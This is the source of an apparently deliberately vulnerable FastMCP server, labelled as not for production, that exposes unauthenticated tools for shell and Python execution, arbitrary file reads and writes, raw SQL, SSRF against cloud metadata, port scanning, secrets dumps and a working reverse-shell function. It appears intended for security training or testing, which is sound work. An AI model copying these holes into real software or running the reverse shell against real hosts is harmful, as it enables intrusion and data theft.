"""
⚠️ VULNERABLE BY DESIGN - DO NOT USE IN PRODUCTION ⚠️

FastMCP Server with INTENTIONAL vulnerabilities:
- All tools exposed without authentication
- Dangerous system tools accessible
- No rate limiting
- Sensitive data exposure
- Command execution tools
"""

from fastmcp import FastMCP
import subprocess
import os
import sqlite3
import json

# ============================================================
# VULNERABILITY: MCP Server with NO AUTHENTICATION
# ============================================================
# Anyone who can reach this endpoint can execute all tools!
# ============================================================

mcp = FastMCP(
    name="Death Cocktail MCP",
    # VULNERABILITY: No authentication configured
    # VULNERABILITY: Debug mode enabled
    debug=True,
)

# ============================================================
# VULNERABILITY: Database with Plaintext Passwords
# ============================================================

def init_database():
    """Initialize database with PLAINTEXT password storage"""
    conn = sqlite3.connect('/app/data/users.db')
    cursor = conn.cursor()

    # VULNERABILITY: Passwords stored in PLAINTEXT!
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            password TEXT NOT NULL,  -- PLAINTEXT! No hashing!
            email TEXT NOT NULL,
            ssn TEXT,                -- Social Security Number in plaintext!
            credit_card TEXT,        -- Credit card in plaintext!
            api_key TEXT,            -- API keys in plaintext!
            session_token TEXT,      -- Session tokens in plaintext!
            reset_token TEXT,        -- Password reset tokens in plaintext!
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    # VULNERABILITY: Sample data with plaintext sensitive info
    sample_users = [
        ('admin', 'admin123', 'admin@company.com', '123-45-6789', '4111111111111111', 'sk_admin_key', None, None),
        ('john', 'password123', 'john@company.com', '987-65-4321', '4222222222222222', 'sk_john_key', None, None),
        ('jane', 'qwerty', 'jane@company.com', '555-55-5555', '4333333333333333', 'sk_jane_key', None, None),
    ]

    cursor.executemany('''
        INSERT OR IGNORE INTO users (username, password, email, ssn, credit_card, api_key, session_token, reset_token)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', sample_users)

    conn.commit()
    conn.close()


# ============================================================
# VULNERABILITY: Dangerous MCP Tools - SHELL EXECUTION
# ============================================================

@mcp.tool()
def execute_shell(command: str) -> str:
    """
    Execute arbitrary shell commands on the server.

    VULNERABILITY: Direct command execution without any validation!
    Any AI model or client can run any system command.
    """
    # VULNERABILITY: No input validation, no sandboxing
    result = subprocess.run(
        command,
        shell=True,  # VULNERABILITY: Shell injection possible
        capture_output=True,
        text=True
    )
    return f"stdout: {result.stdout}\nstderr: {result.stderr}"


@mcp.tool()
def execute_python(code: str) -> str:
    """
    Execute arbitrary Python code on the server.

    VULNERABILITY: Direct code execution - RCE!
    """
    # VULNERABILITY: eval/exec on untrusted input
    try:
        result = eval(code)
        return str(result)
    except:
        exec(code)
        return "Code executed"


# ============================================================
# VULNERABILITY: File System Access Tools
# ============================================================

@mcp.tool()
def read_file(path: str) -> str:
    """
    Read any file from the filesystem.

    VULNERABILITY: Path traversal, no access control
    Can read /etc/passwd, /etc/shadow, SSH keys, etc.
    """
    # VULNERABILITY: No path validation
    with open(path, 'r') as f:
        return f.read()


@mcp.tool()
def write_file(path: str, content: str) -> str:
    """
    Write to any file on the filesystem.

    VULNERABILITY: Arbitrary file write
    Can overwrite /etc/passwd, create cron jobs, etc.
    """
    # VULNERABILITY: No path validation, no permission check
    with open(path, 'w') as f:
        f.write(content)
    return f"Written to {path}"


@mcp.tool()
def list_directory(path: str = "/") -> str:
    """
    List files in any directory.

    VULNERABILITY: Directory traversal
    """
    return "\n".join(os.listdir(path))


# ============================================================
# VULNERABILITY: Database Access Tools - Plaintext Exposure
# ============================================================

@mcp.tool()
def query_database(sql: str) -> str:
    """
    Execute arbitrary SQL queries.

    VULNERABILITY: SQL Injection + Plaintext password exposure
    Can dump all user passwords, credit cards, SSNs
    """
    # VULNERABILITY: Direct SQL execution
    conn = sqlite3.connect('/app/data/users.db')
    cursor = conn.cursor()

    # VULNERABILITY: No parameterization
    cursor.execute(sql)
    results = cursor.fetchall()
    conn.close()

    # VULNERABILITY: Returns sensitive data including plaintext passwords
    return json.dumps(results)


@mcp.tool()
def get_user_credentials(username: str) -> dict:
    """
    Get user credentials including plaintext password.

    VULNERABILITY: Exposes plaintext passwords via MCP!
    """
    conn = sqlite3.connect('/app/data/users.db')
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    user = cursor.fetchone()
    conn.close()

    if user:
        # VULNERABILITY: Returns ALL sensitive data in plaintext
        return {
            "id": user[0],
            "username": user[1],
            "password": user[2],       # PLAINTEXT PASSWORD!
            "email": user[3],
            "ssn": user[4],            # PLAINTEXT SSN!
            "credit_card": user[5],    # PLAINTEXT CREDIT CARD!
            "api_key": user[6],        # PLAINTEXT API KEY!
            "session_token": user[7],
            "reset_token": user[8],
        }
    return {"error": "User not found"}


@mcp.tool()
def create_user(username: str, password: str, email: str,
                ssn: str = None, credit_card: str = None) -> str:
    """
    Create a new user with PLAINTEXT password storage.

    VULNERABILITY: Stores password without hashing!
    """
    conn = sqlite3.connect('/app/data/users.db')
    cursor = conn.cursor()

    # VULNERABILITY: Password stored in PLAINTEXT
    cursor.execute(
        "INSERT INTO users (username, password, email, ssn, credit_card) VALUES (?, ?, ?, ?, ?)",
        (username, password, email, ssn, credit_card)  # NO HASHING!
    )
    conn.commit()
    conn.close()

    # VULNERABILITY: Echoes back the password
    return f"User {username} created with password: {password}"


# ============================================================
# VULNERABILITY: Network/SSRF Tools
# ============================================================

@mcp.tool()
def fetch_url(url: str) -> str:
    """
    Fetch any URL from the server.

    VULNERABILITY: SSRF - can access internal services, cloud metadata
    """
    import urllib.request

    # VULNERABILITY: No URL validation
    # Attack: url=http://169.254.169.254/latest/meta-data/
    # Attack: url=http://internal-service.local/admin
    with urllib.request.urlopen(url) as response:
        return response.read().decode()


@mcp.tool()
def port_scan(host: str, ports: str = "22,80,443,3306,5432") -> str:
    """
    Scan ports on any host.

    VULNERABILITY: Network reconnaissance tool exposed
    """
    import socket
    results = []

    for port in ports.split(","):
        port = int(port.strip())
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            results.append(f"{port}: OPEN")
        sock.close()

    return "\n".join(results) if results else "No open ports found"


# ============================================================
# VULNERABILITY: Environment/Secrets Exposure
# ============================================================

@mcp.tool()
def get_environment() -> dict:
    """
    Get all environment variables.

    VULNERABILITY: Exposes all secrets in environment!
    Including AWS keys, database passwords, API tokens, etc.
    """
    # VULNERABILITY: Returns ALL env vars including secrets
    return dict(os.environ)


@mcp.tool()
def get_config() -> dict:
    """
    Get application configuration.

    VULNERABILITY: Exposes internal configuration and secrets
    """
    return {
        "database": {
            "host": "db.internal.company.com",
            "port": 5432,
            "username": "root",
            "password": "SuperSecret123!",  # PLAINTEXT!
        },
        "redis": {
            "host": "redis.internal",
            "password": "redis_secret",
        },
        "aws": {
            "access_key": os.environ.get("AWS_ACCESS_KEY_ID"),
            "secret_key": os.environ.get("AWS_SECRET_ACCESS_KEY"),
        },
        "jwt_secret": "super-secret-jwt-key",
        "encryption_key": "0123456789abcdef",
        "admin_password": "admin123",
    }


# ============================================================
# VULNERABILITY: Process/System Tools
# ============================================================

@mcp.tool()
def kill_process(pid: int) -> str:
    """
    Kill any process by PID.

    VULNERABILITY: Can kill critical system processes!
    """
    os.kill(pid, 9)
    return f"Process {pid} killed"


@mcp.tool()
def spawn_reverse_shell(host: str, port: int) -> str:
    """
    Spawn a reverse shell to specified host.

    VULNERABILITY: Literal backdoor functionality!
    """
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])
    return "Shell spawned"


# ============================================================
# VULNERABILITY: Server exposed on all interfaces
# ============================================================

if __name__ == "__main__":
    init_database()

    # VULNERABILITY: Binding to 0.0.0.0 - accessible from anywhere!
    # VULNERABILITY: No TLS/HTTPS
    # VULNERABILITY: No authentication
    mcp.run(
        host="0.0.0.0",  # VULNERABILITY: All interfaces
        port=8000,
        debug=True,      # VULNERABILITY: Debug mode in production
    )
